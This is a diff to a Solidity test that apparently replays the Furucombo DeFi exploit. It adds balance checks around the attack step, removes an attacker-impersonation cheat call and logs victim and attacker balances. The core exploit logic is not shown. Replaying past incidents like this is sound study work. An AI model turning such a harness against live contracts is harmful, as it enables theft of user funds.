@@ -127,6 +127,7 @@ contract Exploit_Furucombo is TestHarness, TokenBalanceTracker {
     }
 
     function test_attack() external {
+        uint256 balanceBefore = usdc.balanceOf(tx.origin);
 
         // Check that the malicious implementation is not valid (yet)
         console.log("Check if Aave Proxy is valid initially:", furucomboRegistry.isValid(address(aaveV2Proxy)));
@@ -153,11 +154,14 @@ contract Exploit_Furucombo is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel('Victim', victim);
 
         console.log("==== STEP 2: Execute Attack (transferFrom) ====");
-        cheat.prank(attacker);
+        
         executeTransferFrom();
         logBalancesWithLabel('Attacker', tx.origin);
         logBalancesWithLabel('Attacker Contract', address(this));
         logBalancesWithLabel('Victim', victim);
+
+        uint256 balanceAfter = usdc.balanceOf(tx.origin);
+        assertGe(balanceAfter, balanceBefore);
     }
 
     function executeTransferFrom() internal {
